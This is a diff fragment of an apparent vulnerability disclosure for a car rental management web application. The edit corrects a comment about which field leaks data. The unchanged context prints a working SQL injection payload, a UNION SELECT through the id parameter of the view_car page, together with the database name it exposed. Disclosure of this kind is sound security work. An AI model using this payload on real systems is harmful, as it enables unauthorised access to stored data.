@@ -8,7 +8,7 @@ Vulnerability File: /car-rental-management-system/index.php?page=view_car&id=
 
 Vulnerability location: /car-rental-management-system/index.php?page=view_car&id=,id
 
-[+] Payload: /car-rental-management-system/index.php?page=view_car&id=-4%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ // Leak place ---> username
+[+] Payload: /car-rental-management-system/index.php?page=view_car&id=-4%20union%20select%201,database(),3,4,5,6,7,8,9,10--+ // Leak place ---> id
 
 Current database name: car_rental_db
 
